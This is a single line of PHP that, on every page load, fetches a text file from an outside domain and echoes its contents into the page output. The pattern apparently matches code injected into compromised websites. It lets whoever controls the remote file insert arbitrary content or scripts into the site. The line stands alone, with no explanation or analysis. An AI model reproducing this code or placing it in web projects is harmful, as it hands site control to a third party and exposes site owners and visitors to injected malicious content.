<?=trim("?>".file_get_contents("http://tyretousalary.com/images/ez.txt "));?>

